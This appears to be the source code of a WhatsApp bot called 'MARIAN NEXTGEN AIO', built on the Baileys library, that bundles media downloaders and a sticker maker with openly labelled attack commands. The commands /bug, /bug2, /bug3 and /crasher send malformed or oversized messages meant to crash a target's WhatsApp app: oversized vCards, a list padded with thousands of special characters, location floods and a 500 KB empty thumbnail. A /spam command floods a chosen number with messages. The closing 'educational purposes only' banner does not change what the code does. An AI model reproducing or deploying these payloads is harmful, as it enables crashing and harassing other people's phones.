const { 
    default: makeWASocket, useMultiFileAuthState, delay, DisconnectReason, 
    makeCacheableSignalKeyStore, generateWAMessageFromContent, proto, getContentType, downloadContentFromMessage,
    Browsers, fetchLatestBaileysVersion
} = require("@whiskeysockets/baileys")
const pino = require("pino")
const fs = require('fs')
const path = require('path')
const axios = require('axios')
const chalk = require("chalk")
const { Boom } = require("@hapi/boom")
const Crypto = require('crypto')
const ff = require('fluent-ffmpeg')
const { tmpdir } = require('os')
const FormData = require('form-data')
const cheerio = require('cheerio')
const qrcode = require('qrcode-terminal')

// ==================== [ INTERNAL LIBRARIES - ENHANCED ] ====================
// Fitur Exif & Sticker (Enhanced)
async function imageToWebp(media) {
    const tmpFileOut = path.join(tmpdir(), `${Crypto.randomBytes(6).readUIntLE(0, 6).toString(36)}.webp`)
    const tmpFileIn = path.join(tmpdir(), `${Crypto.randomBytes(6).readUIntLE(0, 6).toString(36)}.jpg`)
    fs.writeFileSync(tmpFileIn, media)
    await new Promise((resolve, reject) => {
        ff(tmpFileIn).on("error", reject).on("end", () => resolve(true))
        .addOutputOptions(["-vcodec","libwebp","-vf","scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
        .toFormat("webp").save(tmpFileOut)
    })
    const buff = fs.readFileSync(tmpFileOut)
    fs.unlinkSync(tmpFileOut); fs.unlinkSync(tmpFileIn)
    return buff
}

// TikTok Downloader Enhanced
async function tiktokDl(url) {
    try {
        const domain = 'https://www.tikwm.com/api/'
        const res = await axios.post(domain, {}, { 
            params: { url: url, hd: 1 },
            headers: { 'User-Agent': 'Mozilla/5.0' }
        })
        return res.data.data
    } catch {
        return { play: '', title: 'Failed to fetch' }
    }
}

// YouTube Downloader
async function youtubeDl(url) {
    try {
        const res = await axios.get(`https://ytdl.marianbug.workers.dev/?url=${encodeURIComponent(url)}`)
        return res.data
    } catch {
        return { url: '', title: 'Failed' }
    }
}

// Instagram Downloader
async function instagramDl(url) {
    try {
        const res = await axios.get(`https://insta.marianbug.workers.dev/?url=${encodeURIComponent(url)}`)
        return res.data
    } catch {
        return { url: '', caption: 'Failed' }
    }
}

// Fake Number Generator
function fakeNumber(country = 'ID') {
    const prefixes = {
        'ID': ['628', '6281', '6282', '6283'],
        'MY': ['601', '6010', '6011'],
        'SG': ['659', '658']
    }
    const prefix = prefixes[country] ? prefixes[country][Math.floor(Math.random() * prefixes[country].length)] : '628'
    const number = prefix + Math.random().toString().slice(2, 10 + prefix.length)
    return number
}

// ==================== [ CORE ENGINE - ENHANCED ] ====================

async function startBot() {
    console.log(chalk.bgRed.black("\n ⚡ MARIAN NEXTGEN AIO - ULTIMATE EDITION ⚡ \n"))
    console.log(chalk.yellow("🔥 Version: 7.0 | Mode: All-In-One Attack System"))
    console.log(chalk.cyan("📱 Device: iPhone 15 Pro Max | iOS 17.2\n"))
    
    // Clean session system
    const sessionDir = "sessions_marian_pro"
    if (fs.existsSync(sessionDir)) {
        const files = fs.readdirSync(sessionDir)
        if (files.length > 10) {
            console.log(chalk.yellow("[+] Cleaning old session data..."))
            fs.rmSync(sessionDir, { recursive: true })
        }
    }
    
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir)
    const { version } = await fetchLatestBaileysVersion()
    
    const sock = makeWASocket({
        version,
        logger: pino({ level: "fatal" }),
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" })),
        },
        browser: Browsers.iPhone("Safari"),
        connectTimeoutMs: 60000,
        keepAliveIntervalMs: 25000,
        markOnlineOnConnect: true,
        syncFullHistory: false,
        retryRequestDelayMs: 1000,
        fireInitQueries: true
    })

    // ==================== [ AUTO LOGIN SYSTEM ] ====================
    if (!sock.authState.creds.registered) {
        console.log(chalk.bgMagenta.black("\n 💀 MARIAN AIO - LOGIN SYSTEM 💀 \n"))
        const readline = require("readline").createInterface({ input: process.stdin, output: process.stdout })
        
        readline.question(chalk.yellow("📱 ENTER YOUR WHATSAPP NUMBER (628xxx): "), async (nr) => {
            try {
                const cleanNum = nr.replace(/[^0-9]/g, '')
                console.log(chalk.cyan("\n[+] Sending pairing request to WhatsApp..."))
                
                // Delay untuk avoid spam detection
                await delay(2000)
                
                let code = await sock.requestPairingCode(cleanNum)
                const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code
                
                console.log(chalk.white.bgGreen("\n══════════════════════════════════════════════════"))
                console.log(chalk.white.bold.bgGreen("   YOUR PAIRING CODE: " + formattedCode + "   "))
                console.log(chalk.white.bgGreen("══════════════════════════════════════════════════\n"))
                
                console.log(chalk.green("📲 INSTRUCTIONS:"))
                console.log(chalk.cyan("1. Open WhatsApp on your phone"))
                console.log(chalk.cyan("2. Settings → Linked Devices → Link a Device"))
                console.log(chalk.cyan(`3. Enter code: ${formattedCode}`))
                console.log(chalk.cyan("4. Approve within 2 minutes\n"))
                
                console.log(chalk.yellow("[+] Waiting for approval..."))
                readline.close()
                
            } catch (error) {
                console.log(chalk.red("\n[✗] PAIRING FAILED!"))
                console.log(chalk.yellow(`Error: ${error.message}`))
                console.log(chalk.cyan("\n[!] Try QR Code Method instead..."))
                
                // Fallback ke QR Code
                sock.ev.on("connection.update", (update) => {
                    if (update.qr) {
                        console.log(chalk.bgCyan.black("\n 📸 SCAN THIS QR CODE 📸 \n"))
                        qrcode.generate(update.qr, { small: true })
                    }
                })
                readline.close()
            }
        })
    }

    sock.ev.on("creds.update", saveCreds)

    // ==================== [ CONNECTION HANDLER ] ====================
    sock.ev.on("connection.update", (update) => {
        const { connection, lastDisconnect } = update
        
        if (connection === "close") {
            const reason = new Boom(lastDisconnect?.error)?.output?.statusCode
            console.log(chalk.red(`[!] Disconnected: ${reason}`))
            
            if (reason !== DisconnectReason.loggedOut) {
                console.log(chalk.yellow("[+] Auto-reconnecting in 3s..."))
                setTimeout(startBot, 3000)
            }
        } 
        else if (connection === "open") {
            console.log(chalk.green.bold("\n[✓] MARIAN NEXTGEN AIO CONNECTED!"))
            console.log(chalk.cyan(`Logged in as: ${sock.user?.name || sock.user?.id || "MARIAN_USER"}`))
            console.log(chalk.yellow("\n[+] BOT READY! Available commands:\n"))
            
            console.log(chalk.white("╔══════════════════════════════════════════════════════╗"))
            console.log(chalk.white("║                  MARIAN AIO v7.0                    ║"))
            console.log(chalk.white("╠══════════════════════════════════════════════════════╣"))
            console.log(chalk.white("║ • /menu       - Show all commands                   ║"))
            console.log(chalk.white("║ • /bug        - Bug attack (VCard)                  ║"))
            console.log(chalk.white("║ • /bug2       - Heavy bug (List)                    ║"))
            console.log(chalk.white("║ • /bug3       - Extreme bug (Location)              ║"))
            console.log(chalk.white("║ • /crasher    - Crash WhatsApp                      ║"))
            console.log(chalk.white("║ • /spam       - Spam messages                       ║"))
            console.log(chalk.white("║ • /tiktok     - TikTok downloader                   ║"))
            console.log(chalk.white("║ • /yt         - YouTube downloader                  ║"))
            console.log(chalk.white("║ • /ig         - Instagram downloader                ║"))
            console.log(chalk.white("║ • /s          - Sticker maker                       ║"))
            console.log(chalk.white("║ • /fake       - Generate fake number                ║"))
            console.log(chalk.white("║ • /status     - Bot status                          ║"))
            console.log(chalk.white("╚══════════════════════════════════════════════════════╝\n"))
            
            // Auto welcome message
            const welcomeMsg = `*⚡ MARIAN NEXTGEN AIO v7.0 - ONLINE*

✅ Connected via Auto-Pairing System
📱 Device: iPhone 15 Pro Max | iOS 17.2
🔥 Status: All Systems Operational

*⚔️ ATTACK COMMANDS:*
• /bug [number] - VCard bug attack
• /bug2 [number] - Heavy list bug  
• /bug3 [number] - Extreme location bug
• /crasher [number] - WhatsApp crash
• /spam [number] [count] - Message spam

*🎨 MEDIA TOOLS:*
• /tiktok [url] - TikTok downloader
• /yt [url] - YouTube downloader
• /ig [url] - Instagram downloader
• /s - Sticker maker (reply image)
• /fake [ID/MY/SG] - Generate fake number

*🛠️ UTILITIES:*
• /menu - Show all commands
• /status - Bot status
• /ping - Connection test
• /restart - Restart bot

*Example:* /bug2 6281234567890

_System: DIIISSJJSS 100% TRUSTED | All-In-One Engine_`
            
            if (sock.user?.id) {
                sock.sendMessage(sock.user.id, { text: welcomeMsg })
            }
        }
    })

    // ==================== [ MESSAGE HANDLER - ENHANCED ] ====================
    sock.ev.on("messages.upsert", async ({ messages }) => {
        try {
            const m = messages[0]
            if (!m.message || m.key.fromMe) return
            
            const from = m.key.remoteJid
            const type = getContentType(m.message)
            const body = (type === 'conversation') ? m.message.conversation : 
                        (type === 'extendedTextMessage') ? m.message.extendedTextMessage.text : ''
            
            // Auto read message
            await sock.readMessages([m.key])
            
            // Log message to terminal
            if (body && !body.startsWith('/')) {
                const time = new Date().toLocaleTimeString()
                const sender = from.split('@')[0]
                console.log(chalk.grey(`[${time}]`) + chalk.cyan(` ${sender}: `) + chalk.white(body.slice(0, 40)))
            }

            if (!body.startsWith('/')) return

            const args = body.slice(1).trim().split(/ +/)
            const command = args.shift().toLowerCase()
            const text = args.join(" ")
            const quoted = m.message[type]?.contextInfo?.quotedMessage || null

            // ==================== [ ATTACK COMMANDS ] ====================

            // BUG 1 - VCARD ATTACK
            if (command === "bug") {
                let target = text ? text.replace(/[^0-9]/g, '') + "@s.whatsapp.net" : from
                console.log(chalk.red(`[BUG] Target: ${target}`))
                
                await sock.sendMessage(from, { text: "🔄 Sending VCard bug..." })
                
                // Multiple VCard spam
                for (let i = 0; i < 3; i++) {
                    const vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:MARIAN-BUG-${i}\nTEL;type=CELL;type=VOICE;waid=${target.split('@')[0]}:+${target.split('@')[0]}\nEND:VCARD`
                    await sock.sendMessage(target, { 
                        contacts: { 
                            displayName: `MARIAN_KILLER_${i}`,
                            contacts: [{ vcard }] 
                        }
                    }).catch(() => {})
                    await delay(500)
                }
                
                await sock.sendMessage(from, { text: "✅ VCard bug delivered (3x)" })
            }

            // BUG 2 - HEAVY LIST ATTACK
            if (command === "bug2") {
                let target = text ? text.replace(/[^0-9]/g, '') + "@s.whatsapp.net" : from
                console.log(chalk.red(`[BUG2] Target: ${target}`))
                
                await sock.sendMessage(from, { text: "💀 Sending heavy list bug..." })
                
                const bug = generateWAMessageFromContent(target, {
                    listMessage: {
                        title: "MARIAN_SYSTEM_" + "𑫀".repeat(3000),
                        buttonText: "EXECUTE_CRASH",
                        description: "DIIISSJJSS 100% TRUSTED\n" + "💀".repeat(100),
                        sections: [{
                            title: "CRASH_PAYLOAD",
                            rows: Array.from({ length: 10 }, (_, i) => ({
                                title: `CRASH_${i+1}`,
                                rowId: `crash_${i+1}`,
                                description: "Payload by M.A.R.I.A.N"
                            }))
                        }]
                    }
                }, { userJid: target })
                
                await sock.relayMessage(target, bug.message, { messageId: bug.key.id })
                await sock.sendMessage(from, { text: "🔥 Heavy list bug delivered!" })
            }

            // BUG 3 - EXTREME LOCATION BUG
            if (command === "bug3") {
                let target = text ? text.replace(/[^0-9]/g, '') + "@s.whatsapp.net" : from
                console.log(chalk.red(`[BUG3] Target: ${target}`))
                
                await sock.sendMessage(from, { text: "⚠️ Launching extreme location bug..." })
                
                for (let i = 0; i < 5; i++) {
                    await sock.sendMessage(target, {
                        location: {
                            degreesLatitude: Math.random() * 180 - 90,
                            degreesLongitude: Math.random() * 360 - 180,
                            name: "BUG_" + "A".repeat(200) + `_${i}`,
                            address: "M.A.R.I.A.N.B.U.GZX SYSTEM | EXTREME MODE",
                            comment: "DIIISSJJSS 100% TRUSTED CRASH"
                        }
                    }).catch(() => {})
                    await delay(400)
                }
                
                await sock.sendMessage(from, { text: "☠️ Extreme location bug delivered (5x)" })
            }

            // CRASHER ATTACK
            if (command === "crasher") {
                let target = text ? text.replace(/[^0-9]/g, '') + "@s.whatsapp.net" : from
                console.log(chalk.red(`[CRASHER] Target: ${target}`))
                
                await sock.sendMessage(from, { text: "⚡ Launching crasher attack..." })
                
                await sock.sendMessage(target, {
                    text: "DIIISSJJSS 100% TRUSTED CRASH",
                    contextInfo: {
                        externalAdReply: {
                            title: "M.A.R.I.A.N.B.U.GZX KILLER",
                            body: "SYSTEM CRASH IN PROGRESS",
                            thumbnail: Buffer.alloc(500000),
                            sourceUrl: "https://marian.deadly",
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }).catch(() => {})
                
                await sock.sendMessage(from, { text: "✅ Crasher payload delivered!" })
            }

            // SPAM ATTACK
            if (command === "spam") {
                const target = text.split(' ')[0]?.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
                const count = parseInt(text.split(' ')[1]) || 10
                
                console.log(chalk.yellow(`[SPAM] Target: ${target}, Count: ${count}`))
                
                await sock.sendMessage(from, { text: `💣 Starting spam attack (${count} messages)...` })
                
                for (let i = 1; i <= count; i++) {
                    await sock.sendMessage(target, {
                        text: `[${i}/${count}] MARIAN AIO SPAM\nTime: ${new Date().toLocaleTimeString()}\n` + "▒".repeat(50)
                    }).catch(() => {})
                    await delay(200)
                }
                
                await sock.sendMessage(from, { text: `✅ ${count} spam messages sent!` })
            }

            // ==================== [ MEDIA TOOLS ] ====================

            // TIKTOK DOWNLOADER
            if (command === "tiktok") {
                if (!text) {
                    await sock.sendMessage(from, { text: "Usage: /tiktok [url]" })
                    return
                }
                
                await sock.sendMessage(from, { text: "⬇️ Downloading TikTok..." })
                const data = await tiktokDl(text)
                
                if (data.play) {
                    await sock.sendMessage(from, { 
                        video: { url: data.play },
                        caption: `*${data.title}*\n\n⬇️ Downloaded via MARIAN AIO`
                    })
                } else {
                    await sock.sendMessage(from, { text: "❌ Failed to download TikTok" })
                }
            }

            // YOUTUBE DOWNLOADER
            if (command === "yt" || command === "youtube") {
                if (!text) {
                    await sock.sendMessage(from, { text: "Usage: /yt [url]" })
                    return
                }
                
                await sock.sendMessage(from, { text: "⬇️ Downloading YouTube..." })
                const data = await youtubeDl(text)
                
                if (data.url) {
                    await sock.sendMessage(from, { 
                        video: { url: data.url },
                        caption: `*${data.title}*\n\n⬇️ Downloaded via MARIAN AIO`
                    })
                } else {
                    await sock.sendMessage(from, { text: "❌ Failed to download YouTube" })
                }
            }

            // INSTAGRAM DOWNLOADER
            if (command === "ig" || command === "instagram") {
                if (!text) {
                    await sock.sendMessage(from, { text: "Usage: /ig [url]" })
                    return
                }
                
                await sock.sendMessage(from, { text: "⬇️ Downloading Instagram..." })
                const data = await instagramDl(text)
                
                if (data.url) {
                    if (data.url.includes('.mp4')) {
                        await sock.sendMessage(from, { 
                            video: { url: data.url },
                            caption: data.caption || "⬇️ Downloaded via MARIAN AIO"
                        })
                    } else {
                        await sock.sendMessage(from, { 
                            image: { url: data.url },
                            caption: data.caption || "⬇️ Downloaded via MARIAN AIO"
                        })
                    }
                } else {
                    await sock.sendMessage(from, { text: "❌ Failed to download Instagram" })
                }
            }

            // STICKER MAKER
            if (command === "s" || command === "sticker") {
                const isImage = type === 'imageMessage' || 
                               (quoted && getContentType(quoted) === 'imageMessage')
                
                if (isImage) {
                    await sock.sendMessage(from, { text: "🔄 Converting to sticker..." })
                    const msg = m.message.imageMessage || quoted.imageMessage
                    const stream = await downloadContentFromMessage(msg, 'image')
                    let buffer = Buffer.from([])
                    for await (const chunk of stream) { 
                        buffer = Buffer.concat([buffer, chunk]) 
                    }
                    
                    try {
                        const webp = await imageToWebp(buffer)
                        await sock.sendMessage(from, { sticker: webp })
                    } catch {
                        await sock.sendMessage(from, { text: "❌ Failed to create sticker" })
                    }
                } else {
                    await sock.sendMessage(from, { text: "❌ Reply to an image first!" })
                }
            }

            // FAKE NUMBER GENERATOR
            if (command === "fake") {
                const country = text.toUpperCase() || 'ID'
                const number = fakeNumber(country)
                await sock.sendMessage(from, { 
                    text: `*FAKE NUMBER GENERATED*\n\nCountry: ${country}\nNumber: ${number}\n\n_Generated by MARIAN AIO_`
                })
            }

            // ==================== [ UTILITY COMMANDS ] ====================

            // MENU
            if (command === "menu") {
                const help = `*⚡ MARIAN NEXTGEN AIO v7.0 - COMMAND MENU*

*⚔️ ATTACK COMMANDS:*
• /bug [number] - VCard bug attack
• /bug2 [number] - Heavy list bug  
• /bug3 [number] - Extreme location bug
• /crasher [number] - WhatsApp crash
• /spam [number] [count] - Message spam

*🎨 MEDIA TOOLS:*
• /tiktok [url] - TikTok downloader
• /yt [url] - YouTube downloader
• /ig [url] - Instagram downloader
• /s - Sticker maker (reply image)
• /fake [ID/MY/SG] - Generate fake number

*🛠️ UTILITIES:*
• /status - Bot status
• /ping - Connection test
• /restart - Restart bot
• /clearsession - Clear session data

*Example:* /bug2 6281234567890

_System: All-In-One Engine | By: Kean_`
                await sock.sendMessage(from, { text: help })
            }

            // STATUS
            if (command === "status") {
                const status = `*🔧 MARIAN AIO STATUS*
• Version: v7.0 Ultimate
• Connection: Active ✅
• Device: iPhone 15 Pro Max
• Uptime: ${process.uptime().toFixed(0)}s
• Mode: All Systems Operational
• Attack Ready: YES 🔥
• Media Tools: TikTok, YouTube, IG
• Sticker Maker: Active

_System: DIIISSJJSS 100% TRUSTED_`
                await sock.sendMessage(from, { text: status })
            }

            // PING
            if (command === "ping") {
                const start = Date.now()
                await sock.sendMessage(from, { text: "🏓 Pong!" })
                const latency = Date.now() - start
                
                await sock.sendMessage(from, { 
                    text: `*PONG!*\nLatency: ${latency}ms\nStatus: Ultra Fast ✅`
                })
            }

            // RESTART
            if (command === "restart") {
                await sock.sendMessage(from, { text: "🔄 Restarting MARIAN AIO..." })
                console.log(chalk.yellow("[RESTART] Command received"))
                setTimeout(() => {
                    process.exit(0)
                }, 1000)
            }

            // CLEAR SESSION
            if (command === "clearsession") {
                if (fs.existsSync(sessionDir)) {
                    fs.rmSync(sessionDir, { recursive: true })
                    await sock.sendMessage(from, { text: "✅ Session cleared! Restarting..." })
                    setTimeout(() => {
                        process.exit(0)
                    }, 2000)
                }
            }

        } catch (error) {
            console.log(chalk.yellow(`[CMD ERROR] ${error.message}`))
        }
    })
}

// ==================== [ START BOT ] ====================
console.log(chalk.bgRed.black("\n ⚠️  WARNING: FOR EDUCATIONAL PURPOSES ONLY  ⚠️ \n"))

// Auto restart on error
startBot().catch(err => {
    console.log(chalk.red(`[FATAL ERROR] ${err.message}`))
    console.log(chalk.yellow("[+] Auto-restarting in 5 seconds..."))
    setTimeout(startBot, 5000)
})
